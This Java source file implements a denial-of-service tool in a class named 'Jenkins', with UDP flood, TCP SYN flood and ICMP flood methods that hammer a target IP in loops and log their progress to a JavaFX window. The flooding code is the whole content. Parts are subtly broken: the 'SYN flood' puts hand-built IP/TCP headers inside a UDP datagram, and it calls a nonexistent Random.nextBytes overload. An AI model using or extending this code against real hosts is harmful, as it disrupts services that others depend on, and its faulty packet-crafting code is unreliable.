package com.yourpackage;

import java.net.DatagramSocket;
import java.net.DatagramPacket;
import java.net.InetAddress;
import java.util.logging.Logger;
import java.net.Socket;
import java.io.OutputStream;
import javafx.scene.control.TextArea;
import javafx.application.Platform;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;
import java.io.File;
import org.jnetpcap.Pcap;
import org.jnetpcap.PcapIf;
import org.jnetpcap.packet.PcapPacket;
import org.jnetpcap.nio.JMemory;
import java.nio.ByteBuffer;
import java.net.UnknownHostException;
import org.jnetpcap.protocol.JProtocol;
import org.jnetpcap.protocol.lan.Ethernet;
import org.jnetpcap.packet.JMemoryPacket;
import org.jnetpcap.protocol.network.Ip4;
import org.jnetpcap.protocol.tcpip.Tcp;
import java.io.IOException;
import java.net.InetAddress;
import java.net.Socket;
import java.net.InetSocketAddress;

public class Jenkins {
    private static final byte[] DEFAULT_PAYLOAD = new byte[1300]; // 1300 bytes payload
    private static final Logger logger = Logger.getLogger(Jenkins.class.getName());
    private volatile boolean stopAttack = false;
    private TextArea logArea;

    // Constructor
    public Jenkins() {
        // Initialize any required resources
    }

    // Method to set the log area
    public void setLogArea(TextArea logArea) {
        this.logArea = logArea;
    }

    // UDP Flood method
    public void udpFlood(String targetIp, int targetPort, int bytesPerSecond) {
        log("Starting UDP flood attack on " + targetIp + ":" + targetPort + " at " + bytesPerSecond + " bytes/second");

        try (DatagramSocket socket = new DatagramSocket()) {
            InetAddress targetAddress = InetAddress.getByName(targetIp);
            byte[] buffer = new byte[1300]; // Adjust packet size if needed
            DatagramPacket packet = new DatagramPacket(buffer, buffer.length, targetAddress, targetPort);

            long startTime = System.currentTimeMillis();
            long bytesSent = 0;
            int packetsSent = 0;

            while (!stopAttack) {
                socket.send(packet);
                bytesSent += buffer.length;
                packetsSent++;

                if (packetsSent % 1000 == 0) { // Log every 1000 packets
                    long elapsedTime = System.currentTimeMillis() - startTime;
                    double actualMbps = (bytesSent * 8.0 / (1024 * 1024)) / (elapsedTime / 1000.0);
                    log(String.format("Sent %d packets, %.2f MB, %.2f Mbps", packetsSent, bytesSent / (1024.0 * 1024), actualMbps));
                }

                // Add rate limiting if necessary
                if (bytesSent >= bytesPerSecond) {
                    long elapsedTime = System.currentTimeMillis() - startTime;
                    if (elapsedTime < 1000) {
                        Thread.sleep(1000 - elapsedTime);
                    }
                    startTime = System.currentTimeMillis();
                    bytesSent = 0;
                }
            }
        } catch (Exception e) {
            log("Error in UDP flood: " + e.getMessage());
        }
        log("UDP flood attack stopped");
    }

    // TCP SYN Flood method
    public void tcpSynFlood(String targetIp, int targetPort, int bytesPerSecond) {
        log("Starting TCP SYN flood attack on " + targetIp + ":" + targetPort + " at " + bytesPerSecond + " bytes/second");

        try {
            InetAddress targetAddress = InetAddress.getByName(targetIp);
            byte[] buffer = new byte[40]; // IP header (20 bytes) + TCP header (20 bytes)
            long startTime = System.currentTimeMillis();
            long packetsSent = 0;
            long bytesSent = 0;

            while (!stopAttack) {
                // Create IP header
                buffer[0] = 0x45; // Version (4) and IHL (5)
                buffer[1] = 0x00; // DSCP and ECN
                buffer[2] = 0x00; buffer[3] = 0x28; // Total length (40 bytes)
                buffer[4] = 0x00; buffer[5] = 0x00; // Identification
                buffer[6] = 0x00; buffer[7] = 0x00; // Flags and Fragment offset
                buffer[8] = (byte) 0x80; // TTL
                buffer[9] = 0x06; // Protocol (TCP)
                // Checksum (10-11) will be calculated later
                System.arraycopy(InetAddress.getLocalHost().getAddress(), 0, buffer, 12, 4); // Source IP
                System.arraycopy(targetAddress.getAddress(), 0, buffer, 16, 4); // Destination IP

                // Create TCP header
                buffer[20] = (byte) (new Random().nextInt(65536) >> 8); // Source port (random)
                buffer[21] = (byte) (new Random().nextInt(65536));
                buffer[22] = (byte) (targetPort >> 8); // Destination port
                buffer[23] = (byte) targetPort;
                // Sequence number (24-27) - random
                new Random().nextBytes(buffer, 24, 4);
                // Acknowledgment number (28-31) - set to 0
                // Data offset and flags (32-33)
                buffer[32] = 0x50; // Data offset (5) and reserved bits
                buffer[33] = 0x02; // SYN flag
                buffer[34] = 0x72; buffer[35] = 0x10; // Window size
                // Checksum (36-37) will be calculated later
                // Urgent pointer (38-39) set to 0

                // Calculate IP checksum
                int sum = 0;
                for (int i = 0; i < 20; i += 2) {
                    sum += ((buffer[i] & 0xFF) << 8) | (buffer[i + 1] & 0xFF);
                }
                sum = (sum >> 16) + (sum & 0xFFFF);
                sum += sum >> 16;
                buffer[10] = (byte) (~sum >> 8);
                buffer[11] = (byte) ~sum;

                // Send the packet using a raw socket
                try (DatagramSocket socket = new DatagramSocket()) {
                    DatagramPacket packet = new DatagramPacket(buffer, buffer.length, targetAddress, targetPort);
                    socket.send(packet);
                    packetsSent++;
                    bytesSent += buffer.length;

                    if (packetsSent % 1000 == 0) {
                        long elapsedTime = System.currentTimeMillis() - startTime;
                        double actualMbps = (bytesSent * 8.0 / (1024 * 1024)) / (elapsedTime / 1000.0);
                        log(String.format("Sent %d packets, %.2f MB, %.2f Mbps", packetsSent, bytesSent / (1024.0 * 1024), actualMbps));
                    }

                    // Rate limiting
                    if (bytesSent >= bytesPerSecond) {
                        long elapsedTime = System.currentTimeMillis() - startTime;
                        if (elapsedTime < 1000) {
                            Thread.sleep(1000 - elapsedTime);
                        }
                        startTime = System.currentTimeMillis();
                        bytesSent = 0;
                    }
                }
            }
        } catch (Exception e) {
            log("Error in TCP SYN flood: " + e.getMessage());
        }

        log("TCP SYN flood attack stopped");
    }

    // ICMP Flood method
    public void icmpFlood(String targetIp, int bytesPerSecond) {
        log("Starting ICMP flood attack on " + targetIp + " at " + bytesPerSecond + " bytes/second");

        try {
            long startTime = System.currentTimeMillis();
            int bytesSent = 0;
            int packetsSent = 0;

            while (!stopAttack) {
                long currentTime = System.currentTimeMillis();
                if (bytesSent / Math.max((currentTime - startTime) / 1000.0, 1) < bytesPerSecond) {
                    Process process = new ProcessBuilder("ping", "-n", "1", "-l", "1300", targetIp).start();
                    process.waitFor();
                    bytesSent += 1300; // Increased packet size
                    packetsSent++;

                    if (packetsSent % 100 == 0) {
                        log(String.format("Sent %d ICMP packets, %.2f MB", packetsSent, bytesSent / (1024.0 * 1024)));
                    }
                } else {
                    Thread.sleep(1);
                }
            }
        } catch (Exception e) {
            log("Error during ICMP flood: " + e.getMessage());
        } finally {
            log("ICMP flood attack stopped on " + targetIp);
            stopAttack = false;
        }
    }

    // Method to stop the attack
    public void stopAttack() {
        stopAttack = true;
        log("Stop attack flag set to true");
    }

    // Method to reset the attack
    public void resetAttack() {
        stopAttack = false;
    }

    // Method to log a message
    private void log(String message) {
        logger.info(message);
        if (logArea != null) {
            Platform.runLater(() -> {
                logArea.appendText(LocalDateTime.now().format(DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss")) + " - " + message + "\n");
            });
        }
    }
}
